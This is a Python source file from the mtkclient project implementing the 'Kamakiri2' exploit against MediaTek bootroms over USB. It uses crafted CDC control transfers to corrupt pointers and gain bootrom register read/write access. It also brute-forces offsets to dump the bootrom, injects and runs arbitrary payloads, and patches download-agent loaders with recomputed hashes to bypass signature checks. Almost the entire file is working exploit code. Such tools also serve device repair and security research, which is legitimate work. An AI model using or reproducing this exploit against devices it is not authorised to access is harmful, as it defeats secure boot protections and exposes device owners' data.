#!/usr/bin/python3
# -*- coding: utf-8 -*-
# (c) B.Kerler 2018-2025 GPLv3 License
import hashlib
import logging
import array
import os
from binascii import hexlify
from struct import pack, unpack

from mtkclient.Library.exploit_handler import Exploitation
from mtkclient.Library.gui_utils import LogBase, progress
from mtkclient.Library.Connection.usblib import usb


class Kamakiri2(Exploitation, metaclass=LogBase):

    def __init__(self, mtk, loglevel=logging.INFO):
        super().__init__(mtk, loglevel)
        self.udev = None
        self.linecode = None

    def kamakiri2(self, addr):
        self.udev = self.mtk.port.cdc.device
        try:
            if self.linecode is None:
                # self.linecode = array('B', [0x80, 0x25, 0, 0, 0, 0, 8, 0])
                self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x25, 0, 0, 8) + array.array('B', [0])
            # array('B', [128, 37, 0, 0, 0, 0, 8, 0, addr, addr, addr, addr])
            self.udev.ctrl_transfer(0x21, 0x20, 0, 0, self.linecode + array.array('B', pack("<I", addr)))
            self.udev.ctrl_transfer(0x80, 0x6, 0x02FF, 0, 9)
        except Exception:
            pass

    def da_read_write(self, address, length, data=None, check_result=True):
        self.udev = self.mtk.port.cdc.device
        try:
            self.mtk.preloader.brom_register_access(0, 1)
            self.mtk.preloader.read32(self.mtk.config.chipconfig.watchdog + 0x50)
        except Exception:
            pass

        ptr_da = None
        if self.mtk.config.chipconfig.brom_register_access is not None:
            ptr_da = self.mtk.config.chipconfig.brom_register_access[0][1]
        if ptr_da is None:
            assert "Unknown cpu config. Please try to dump brom and send to the author"
        # 0x40404000
        for i in range(3):
            self.kamakiri2(ptr_da + 8 - 3 + i)

        if address < 0x40:
            # 0x0
            for i in range(4):
                self.kamakiri2(ptr_da - 6 + (4 - i))
            return self.mtk.preloader.brom_register_access(address, length, data, check_result)
        else:
            # 0x00000040
            for i in range(3):
                self.kamakiri2(ptr_da - 5 + (3 - i))
            return self.mtk.preloader.brom_register_access(address - 0x40, length, data, check_result)

    def exploit(self, payload, payloadaddr=None):
        # noinspection PyProtectedMember
        if payloadaddr is None:
            payloadaddr = self.chipconfig.brom_payload_addr
        try:
            # self.mtk.port.cdc.device.reset()
            if self.linecode is None:
                self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
            ptr_send = unpack("<I", self.da_read(self.mtk.config.chipconfig.send_ptr[0][1], 4))[0] + 8
            self.da_write(payloadaddr, len(payload), payload)
            self.da_write(ptr_send, 4, pack("<I", payloadaddr), False)
        except usb.core.USBError as e:
            print("USB CORE ERROR")
            print(e)
        return True

    def bruteforce(self, args, startaddr=0x9900):
        found = False
        while not found:
            # self.mtk.init()
            self.mtk.preloader.display = False
            if self.mtk.preloader.init(display=False):
                self.mtk = self.mtk.crasher(display=False)
                self.info(f"Bruteforce, testing {hex(startaddr)}...")
                if self.linecode is None:
                    self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
                found, startaddr = self.newbrute(startaddr)
                if found:
                    filename = args.filename
                    if filename is None:
                        cpu = ""
                        if self.mtk.config.cpu != "":
                            cpu = "_" + self.mtk.config.cpu
                        filename = f"brom{cpu}_{hex(self.mtk.config.hwcode)[2:]}.bin"
                    self.info(f"Found {hex(startaddr)}, dumping bootrom to {filename}")
                    self.dump_brom(filename, dump_ptr=startaddr)
                    break
                else:
                    print("Please dis- and reconnect device to brom mode to continue ...")
                    self.mtk.port.close()
        return True

    def newbrute(self, dump_ptr, dump=False):
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        if udev is None:
            return None
        addr = self.mtk.config.chipconfig.watchdog + 0x50
        try:
            # noinspection PyProtectedMember
            udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
        except AttributeError as e:
            raise RuntimeError(f"libusb is not installed for port {udev.dev.port}") from e

        if dump:
            try:
                self.mtk.preloader.brom_register_access(0, 1)
                self.mtk.preloader.read32(addr)
            except Exception:
                pass

            for i in range(4):
                self.kamakiri2(dump_ptr - 6 + (4 - i))

            brom = bytearray(self.mtk.preloader.brom_register_access(0, 0x20000))
            brom[dump_ptr - 1:] = b"\x00" + int.to_bytes(0x100030, 4, 'little') + brom[dump_ptr + 4:]
            return brom

        else:
            try:
                self.mtk.preloader.brom_register_access(0, 1)
                self.mtk.preloader.read32(addr)
            except Exception:
                pass

            for address in range(dump_ptr, 0xffff, 4):
                if address % 0x100 == 0:
                    self.info(f"Bruteforce, testing {hex(address)}...")
                for i in range(3):
                    self.kamakiri2(address - 5 + (3 - i))
                try:
                    if (len(self.mtk.preloader.brom_register_access(0, 0x40))) == 0x40:
                        return True, address
                except RuntimeError:
                    try:
                        self.info(f"Bruteforce, testing {hex(address)}...")
                        self.mtk.preloader.read32(addr)
                    except Exception:
                        return False, address + 4
                except Exception:
                    return False, address + 4
        return False, dump_ptr + 4

    def dump_brom(self, filename, dump_ptr=None, length=0x20000):
        if dump_ptr is None:
            try:
                with open(filename, 'wb') as wf:
                    length = self.mtk.port.usbread(4)
                    length = int.from_bytes(length, 'big')
                    rlen = min(length, 0x20000)
                    pg = progress(total=length // rlen, pagesize=1, prefix='Progress:')
                    for i in range(length // rlen):
                        data = self.mtk.port.usbread(rlen)
                        wf.write(data)
                        pg.update(i)
                    pg.done()
                    return True
            except Exception as e:
                self.error(f"Error on opening {filename} for writing: {str(e)}")
                return False
        else:
            try:
                with open(filename, 'wb') as wf:
                    wf.write(self.newbrute(dump_ptr, True))
                    return True
            except Exception as e:
                self.error(f"Error on opening {filename} for writing: {str(e)}")
                return False

    def dump_preloader(self, filename=None):
        rfilename = None
        data = None
        length = unpack("<I", self.mtk.port.usbread(4))[0]
        if length > 0:
            data = self.mtk.port.usbread(length)
            idx = data.find(b"MTK_BLOADER_INFO")
            if idx != -1:
                rfilename = data[idx + 0x1B:idx + 0x1B + 0x30].rstrip(b"\x00").decode('utf-8')
        if filename is None:
            return data, rfilename
        else:
            self.info("Dumped preloader")
            with open(filename, 'wb') as wf:
                wf.write(data)

    def payload(self, payload, daaddr):
        ptype = "kamakiri2"
        self.hwcrypto.disable_range_blacklist(ptype, self.mtk.preloader.run_ext_cmd)
        try:
            while len(payload) % 4 != 0:
                payload += b"\x00"

            words = []
            for x in range(len(payload) // 4):
                word = payload[x * 4:(x + 1) * 4]
                word = unpack("<I", word)[0]
                words.append(word)

            self.info("Sending payload")
            self.write32(self, words)

            self.info("Running payload ...")
            self.write32(self.mtk.config.chipconfig.blacklist[0][0] + 0x40, daaddr)
            return True
        except Exception as e:
            self.error("Failed to load payload file. Error: " + str(e))
        return False

    def runpayload(self, payload, ack=0xA1A2A3A4, addr=None, dontack=False):
        self.info("Kamakiri Run")
        if addr is None:
            addr = self.chipconfig.brom_payload_addr
        if self.da_payload(payload, addr, True):
            if dontack:
                return ack
            result = self.usbread(4)
            if result == pack(">I", ack):
                return ack
            else:
                self.info(f"Error, payload answered instead: {hexlify(result).decode('utf-8')}")
        return None

    def patchda1_and_da2(self):
        da1offset = self.mtk.daloader.daconfig.da_loader.region[1].m_buf
        da1size = self.mtk.daloader.daconfig.da_loader.region[1].m_len
        da1address = self.mtk.daloader.daconfig.da_loader.region[1].m_start_addr
        da1sig_len = self.mtk.daloader.daconfig.da_loader.region[2].m_sig_len
        da2offset = self.mtk.daloader.daconfig.da_loader.region[2].m_buf
        da2size = self.mtk.daloader.daconfig.da_loader.region[2].m_len
        da2address = self.mtk.daloader.daconfig.da_loader.region[2].m_start_addr
        _ = da1address, da2address
        da2sig_len = self.mtk.daloader.daconfig.da_loader.region[2].m_sig_len
        loader = self.mtk.daloader.daconfig.da_loader.loader
        if not os.path.exists(loader):
            self.error(f"Couldn't find {loader}, aborting.")
            return False
        with open(loader, 'rb') as bootldr:
            bootldr.seek(da1offset)
            da1 = bootldr.read(da1size)
            bootldr.seek(da2offset)
            da2 = bootldr.read(da2size)
            hashaddr, hashmode, hashlen = self.mtk.daloader.compute_hash_pos(da1, da2, da1sig_len, da2sig_len,
                                                                             self.mtk.daloader.daconfig.da_loader.v6)
            da2patched = self.mtk.daloader.patch_da2(da2)[:-da2sig_len]
            if hashaddr is not None:
                dahash = None
                if hashmode == 0:
                    dahash = hashlib.md5(da2patched[:hashlen]).digest()
                elif hashmode == 1:
                    dahash = hashlib.sha1(da2patched[:hashlen]).digest()
                elif hashmode == 2:
                    dahash = hashlib.sha256(da2patched[:hashlen]).digest()
                da1patched = da1[:hashaddr] + dahash + da1[hashaddr + hashlen:]
                return da1patched, da2patched
        self.mtk.daloader.patch = False
        return da1, da2
